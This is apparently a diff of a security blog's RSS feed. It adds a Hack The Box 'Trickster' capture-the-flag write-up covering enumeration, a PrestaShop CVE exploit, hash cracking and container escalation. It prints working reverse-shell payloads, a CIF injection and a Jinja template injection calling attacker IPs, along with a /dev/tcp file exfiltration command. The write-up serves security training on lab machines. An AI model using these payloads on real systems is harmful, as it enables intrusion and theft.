@@ -450,20 +450,20 @@ loop_
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">_space_group_magn<span style="color:#f92672">.</span>transform_BNS_Pp_abc  <span style="color:#e6db74">&#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&#34;__sub&#34; + &#34;classes__&#34;]) () if d.__name__ == &#34;BuiltinImporter&#34;][0].load_module (&#34;os&#34;).system (&#34;/bin/bash -c </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">sh -i &gt;&amp; /dev/tcp/10.10.14.57/4444 0&gt;&amp;1</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#34;);0,0,0&#39;</span>
 _space_group_magn<span style="color:#f92672">.</span>number_BNS  <span style="color:#ae81ff">62.448</span>
 _space_group_magn<span style="color:#f92672">.</span>name_BNS  <span style="color:#e6db74">&#34;P  n&#39;  m  a&#39;  &#34;</span>
-</code></pre></div><p>After uploading the modified .cif file and clicking the &ldquo;view&rdquo; button, a reverse shell connection was established, allowing access to the server.
-<img src="attachment/98544c9579f85dbaff4467d330a40405.png" alt=""></p>
+</code></pre></div><p>After uploading the modified .cif file and clicking the &ldquo;view&rdquo; button, a reverse shell connection was established, allowing access to the server.</p>
+<p><img src="attachment/98544c9579f85dbaff4467d330a40405.png" alt=""></p>
 <p>Once in I browsed trough folders and found a .db file in <strong>/instance</strong>:</p>
 <p><img src="attachment/a07416b7d39814bf65a972ab67ce98cb.png" alt=""></p>
-<p>So copy it and store in local to analyze and the go to <a href="https://inloop.github.io/sqlite-viewer/">https://inloop.github.io/sqlite-viewer/</a> to visualize it:
-<img src="attachment/ae5c718a5452b6ba809d75e9acc8f8bb.png" alt=""></p>
+<p>So copy it and store in local to analyze and the go to <a href="https://inloop.github.io/sqlite-viewer/">https://inloop.github.io/sqlite-viewer/</a> to visualize it:</p>
+<p><img src="attachment/ae5c718a5452b6ba809d75e9acc8f8bb.png" alt=""></p>
 <pre tabindex="0"><code>rosa:63ed86ee9f624c7b14f1d4f43dc251a5
 </code></pre><p>After cracking the MD5 hash on CrackStation, I obtained the following plaintext password:</p>
 <p><img src="attachment/d2fe7632ffcd0ede2092fc06eb355cca.png" alt=""></p>
 <pre tabindex="0"><code>rosa:unicorniosrosados
 </code></pre><h3 id="ssh-access">SSH Access</h3>
 <p>With the cracked credentials, I attempted to establish an SSH connection to the machine as the user rosa. This provided access to additional internal services. Port Forwarding and Service Exploration</p>
-<p>After connecting via SSH, I noticed an internal service running on port 8080, which wasn’t directly exposed externally.
-<img src="attachment/3e53bd91182caf7e0eb31b8d52df7f50.png" alt=""></p>
+<p>After connecting via SSH, I noticed an internal service running on port 8080, which wasn’t directly exposed externally.</p>
+<p><img src="attachment/3e53bd91182caf7e0eb31b8d52df7f50.png" alt=""></p>
 <p><img src="attachment/edc77558fb5d6ae50ac9eabb0bb941b2.png" alt=""></p>
 <p>Using SSH port forwarding, I forwarded this port to my local machine and accessed the web application it hosted.</p>
 <p><img src="attachment/b3d5c6e7ee201e4bc7fb601a08bfba53.png" alt=""></p>
@@ -1440,6 +1440,190 @@ cat root.txt
 user:15fd56e82fdefb166bfb1631b6c6360a
 
 </code></pre>]]></content>
+        </item>
+        
+        <item>
+            <title></title>
+            <link>https://v3l1d.github.io/posts/trickster/</link>
+            <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+            
+            <guid>https://v3l1d.github.io/posts/trickster/</guid>
+            <description>Port Scan ┌──(kali㉿kali)-[~/HTB/Trickster] └─$ nmap -sC -sV -A -T4 10.10.11.34 -o scan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-07 16:28 EST Nmap scan report for 10.10.11.34 Host is up (0.088s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA) |_ 256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://trickster.</description>
+            <content type="html"><![CDATA[<h3 id="port-scan">Port Scan</h3>
+<p><img src="attachment/67ded40961c0ff7d9273362b8671de4c.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Trickster<span style="color:#f92672">]</span>
+└─$ nmap -sC -sV -A -T4  10.10.11.34 -o scan
+Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-07 16:28 EST
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.34
+Host is up <span style="color:#f92672">(</span>0.088s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">256</span> 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://trickster.htb/
+|_http-server-header: Apache/2.4.52 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5.0
+OS details: Linux 5.0
+Network Distance: <span style="color:#ae81ff">2</span> hops
+Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span style="color:#f92672">(</span>using port 80/tcp<span style="color:#f92672">)</span>
+HOP RTT       ADDRESS
+<span style="color:#ae81ff">1</span>   54.63 ms  10.10.14.1
+<span style="color:#ae81ff">2</span>   171.63 ms 10.10.11.34
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 62.45 seconds
+
+</code></pre></div><p><img src="attachment/1c65b14c8845d5d6c409e2fe6c8cea9c.png" alt=""></p>
+<h3 id="initial-port-scan">Initial Port Scan</h3>
+<p>An initial scan of the target revealed two open ports:</p>
+<ul>
+<li><strong>Port 22 (SSH)</strong>: Running OpenSSH 8.9p1 Ubuntu</li>
+<li><strong>Port 80 (HTTP)</strong>: Hosting Apache HTTPD 2.4.52 (Ubuntu)</li>
+</ul>
+<p>Upon accessing the HTTP server, we were redirected to <code>trickster.htb</code>.</p>
+<h3 id="domain-setup">Domain Setup</h3>
+<p>To interact with the web application, the domain <code>trickster.htb</code> was mapped in the hosts file. Within the site, navigation to the &ldquo;Shop&rdquo; section revealed a secondary domain, <code>shop.trickster.htb</code>, hosted on the PrestaShop CMS platform.</p>
+<p><img src="attachment/897c652fd839484ba4b2f5b96130e042.png" alt=""></p>
+<h3 id="subdomain-and-directory-enumeration">Subdomain and Directory Enumeration</h3>
+<p>Using <code>ffuf</code>, additional directories were enumerated, including a <code>.git</code> directory, which was cloned to analyze the codebase and potentially uncover sensitive information.</p>
+<p><img src="attachment/d22a5efce6929175cd374d4a81e4c62b.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://FUZZ.trickster.htb -H <span style="color:#e6db74">&#34;Host: FUZZ.trickster.htb&#34;</span> -mc 200,301,302
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://shop.trickster.htb/FUZZ -mc 200,204,301,302
+
+</code></pre></div><p>Found that <strong>/.git</strong> is accessible:</p>
+<p><img src="attachment/7b0b3d89b0818e460536f759d1b889c9.png" alt=""></p>
+<h3 id="git-repository-analysis">Git Repository Analysis</h3>
+<p>The cloned Git repository was examined for sensitive information, such as configuration files, credentials, and historical changes. This analysis aimed to uncover potential exploits or backdoors inadvertently committed to the repository.
+Use  <a href="https://github.com/arthaud/git-dumper">GitDumper</a> to clone the disclosured repo:</p>
+<p><img src="attachment/35b30b9a446de17ebcc9faa7c28dc2b9.png" alt=""></p>
+<p>Log the last commit with git show:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">git show 
+</code></pre></div><p>Found the admin panel is on <strong>admin634ewutrx1jgitlooaj</strong></p>
+<p><img src="attachment/0f3ad9ccf91a2c50385895f77d0c3e42.png" alt=""></p>
+<h3 id="prestashop-vulnerability">PrestaShop Vulnerability</h3>
+<p>The version of Prestashop installed is <strong>8.1.5</strong> and is vulenarable to <a href="https://github.com/aelmokhtar/CVE-2024-34716">CVE-2024-34716</a> , so let&rsquo;s clone the repository and run the exploit, considering it needs admin email which can be found in the home page of the shop website: <a href="mailto:admin@trickster.htb">admin@trickster.htb</a>.</p>
+<p><img src="attachment/81ac4781d4b78a75ed9cd39346910157.png" alt=""></p>
+<p>So run the command with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">python3 exploit.py --url http://shop.trickster.htb --email admin@trickster.htb --local-ip 10.10.15.30 --admin-path admin634ewutrx1jgitlooaj
+</code></pre></div><p><img src="attachment/0aba520562919356f369b0b1454c54ad.png" alt=""></p>
+<p>In config.inc.php:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cd /var/www/prestashop/config
+$ cat config.inc.php | grep parameters
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>!file_exists<span style="color:#f92672">(</span>_PS_ROOT_DIR_ . <span style="color:#e6db74">&#39;/app/config/parameters.yml&#39;</span><span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> !file_exists<span style="color:#f92672">(</span>_PS_ROOT_DIR_ . <span style="color:#e6db74">&#39;/app/config/parameters.php&#39;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+
+</code></pre></div><p>Let&rsquo;s go into <strong>/app/config/</strong> and cat <strong>parameters.php</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cd app
+$ cd config
+$ cat parameters.php
+
+</code></pre></div><p><img src="attachment/42eed0c92965c4c772e728957d7d0b30.png" alt=""></p>
+<p>Let&rsquo;s log in in the database:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ mysql -u ps_user -p
+Enter password: prest@shop_o
+</code></pre></div><p><img src="attachment/46c4524879673c1379e7440cccba6f79.png" alt="">
+<img src="attachment/e783ffe5d7b74023eb8f2cffb914211a.png" alt=""></p>
+<p>Go look inside ps_employee table and you will able to find users credentials:</p>
+<pre tabindex="0"><code>admin@trickster.htb | $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C
+james@trickster.htb | $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm 
+</code></pre><p><img src="attachment/0d221a333752ae8d0aab62f2a20cd320.png" alt=""></p>
+<p>Logout from reverse shell and try to crack with hashcat</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Trickster/CVE-2024-34716<span style="color:#f92672">]</span>
+└─$ cat james_hash        
+$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm                  
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Trickster/CVE-2024-34716<span style="color:#f92672">]</span>
+└─$ hashcat -m <span style="color:#ae81ff">3200</span> -a <span style="color:#ae81ff">0</span> james_hash /usr/share/wordlists/rockyou.txt
+.....
+$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm:alwaysandforever
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: <span style="color:#ae81ff">3200</span> <span style="color:#f92672">(</span>bcrypt $2*$, Blowfish <span style="color:#f92672">(</span>Unix<span style="color:#f92672">))</span>
+Hash.Target......: $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6y...yunCmm
+Time.Started.....: Fri Nov  <span style="color:#ae81ff">8</span> 17:00:13 <span style="color:#ae81ff">2024</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">12</span> secs<span style="color:#f92672">)</span>
+Time.Estimated...: Fri Nov  <span style="color:#ae81ff">8</span> 17:00:25 <span style="color:#ae81ff">2024</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
+Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+Speed.#1.........:     <span style="color:#ae81ff">3156</span> H/s <span style="color:#f92672">(</span>3.38ms<span style="color:#f92672">)</span> @ Accel:4 Loops:16 Thr:1 Vec:1
+Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>total<span style="color:#f92672">)</span>, 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>new<span style="color:#f92672">)</span>
+Progress.........: 37056/14344384 <span style="color:#f92672">(</span>0.26%<span style="color:#f92672">)</span>
+Rejected.........: 0/37056 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
+Restore.Point....: 37040/14344384 <span style="color:#f92672">(</span>0.26%<span style="color:#f92672">)</span>
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-16
+Candidate.Engine.: Device Generator
+Candidates.#1....: alwaysandforever -&gt; Victor
+Hardware.Mon.#1..: Util: 76%
+
+james<span style="color:#960050;background-color:#1e0010">&#39;</span> password is alwaysandforever
+</code></pre></div><p>Let&rsquo;s try ssh into james:</p>
+<p><img src="attachment/50822814d5b555df16d269aeabc66e90.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">userflag:24cd8325f667dad2097e5f8ef8c0df48
+</code></pre></div><p><img src="attachment/a505ffd0bd450558a72d269d92f43ded.png" alt=""></p>
+<p>From linpeas there is docker network interface, this means containers are running, so we have to find the right port on which it&rsquo;s running, but we can&rsquo;t access docker&rsquo;s data as far as we are not sudo. Let&rsquo;s test some ports trough:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+TARGET_IP<span style="color:#f92672">=</span>$1
+START_PORT<span style="color:#f92672">=</span>$2
+END_PORT<span style="color:#f92672">=</span>$3
+
+<span style="color:#66d9ef">for</span> <span style="color:#f92672">((</span> port<span style="color:#f92672">=</span>$START_PORT; port&lt;<span style="color:#f92672">=</span>$END_PORT; port++ <span style="color:#f92672">))</span>
+<span style="color:#66d9ef">do</span>
+    nc -zv -w <span style="color:#ae81ff">1</span> $TARGET_IP $port &amp;&gt; /dev/null
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> $? -eq <span style="color:#ae81ff">0</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+        echo <span style="color:#e6db74">&#34;Port </span>$port<span style="color:#e6db74"> is open&#34;</span>
+    <span style="color:#66d9ef">else</span>
+        echo <span style="color:#e6db74">&#34;Port </span>$port<span style="color:#e6db74"> is closed&#34;</span>
+    <span style="color:#66d9ef">fi</span>
+<span style="color:#66d9ef">done</span>
+
+</code></pre></div><p>Save this script into a file and run <strong>chmod +x script.sh</strong> and</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">james@trickster:/tmp$ ./script.sh 172.17.0.2 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">5000</span>
+</code></pre></div><p>so try to forward this port trough ssh</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Trickster/CVE-2024-34716<span style="color:#f92672">]</span>
+└─$ ssh -L 5000:172.17.0.2:5000 james@10.10.11.34
+james@10.10.11.34<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+Last login: Fri Nov  <span style="color:#ae81ff">8</span> 22:02:00 <span style="color:#ae81ff">2024</span> from 10.10.15.30
+james@trickster:~$ 
+</code></pre></div><p>On localhost 5000 we have <strong>changedetection</strong> login panel, in which we can login using same james password:
+<img src="attachment/33400c8b90e6df882197e4b56a4edb74.png" alt="">
+Version: <strong>v0.45.20</strong> and googling about i found this vulnerability XSS: <a href="https://github.com/dgtlmoon/changedetection.io">GitHub</a>,  let&rsquo;s try if its vulnerable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&#34;&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(document.domain)</span>&gt;
+</code></pre></div><p><img src="attachment/f4d6ddec3085ce1cad7f0abba879b96e.png" alt=""></p>
+<p>Use this payload: <a href="https://github.com/zcrosman/cve-2024-32651">cve-2024-32651</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">python3 cve-2024-32651.py --url http://localhost:5000 --ip 10.10.15.30
+</code></pre></div><p><img src="attachment/f3ae96af176261a246b4eadabb50dbce.png" alt=""></p>
+<p>Go in Notifications tab using the payload below and click on send test Notification:</p>
+<p><img src="attachment/0ff84977b055f472760647c885de0ccc.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">gets:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10.15.30</span>
+<span style="color:#f92672">------------------</span>
+{{ self<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;python3 -c </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.15.30&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;bash&#34;)</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;</span>) }}
+</code></pre></div><p>Now the exploit will send you the container&rsquo;s root shell on listening terminal:</p>
+<p><img src="attachment/67e8a5a63c7690ca25b2551630cd6610.png" alt=""></p>
+<p>from /datastore folder:</p>
+<p><img src="attachment/e679c795e0880e4f4b276f1c8448dad5.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nc -l -p <span style="color:#ae81ff">9999</span> -q <span style="color:#ae81ff">1</span> &gt; changedetection-backup-20240830194841.zip
+-------
+cat changedetection-backup-20240830194841.zip &gt; /dev/tcp/10.10.14.71/9999  
+</code></pre></div><p><img src="attachment/4d707819c5f159f197f356f2afc88cad.png" alt=""></p>
+<p>After transferring the backup zipped file, go inside <strong>b4a8b52d-651b-44bc-bbc6-f9e8c6590103</strong> and extract <strong>txt.br</strong> file with brotli, and inside the extracted txt file i found adam&rsquo;s credentials.</p>
+<p><img src="attachment/4299022f2c90fe8e6dd349c44a7ea175.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL"><span style="color:#e6db74">&#39;database_user&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;adam&#39;</span> ,                                                        <span style="color:#e6db74">&#39;database_password&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;adam_admin992&#39;</span> 
+</code></pre></div><p>Let&rsquo;s use them to ssh into machine as adam, and check his permissions.</p>
+<p><img src="attachment/9ece5ab93519f5774b3d0caacc1bf327.png" alt=""></p>
+<p>This user can execute <strong>prusaslicer</strong> file as SUDO. Googling it i found that is vulnerbale to
+<a href="https://medium.com/@kimelmicah/prusaslicer-exploit-cve-2023-47268-5792f9e11357">#CVE-2023–47268</a>, for which you can find exploit here: <a href="https://www.exploit-db.com/exploits/51983">ExploitDB</a> . A better version <a href="https://github.com/suce0155/prusaslicer_exploit">PrusaSlicer Exploit</a>, clone this repository on your kali machine and then pass on the HTB machine. Run the exploit trough <strong>sudo ./prusaslicer -s /tmp/evil.3mf</strong></p>
+<p><img src="attachment/c2ab169186cd3cd0a092692db7f80aa0.png" alt=""></p>
+<p>And you gain the root shell:</p>
+<p><img src="attachment/f031f9642bd71f296e9192a5e4ad6f82.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">rootflag:e2c080517bfa23fd1710c6e1c5918f83
+</code></pre></div>]]></content>
         </item>
         
     </channel>
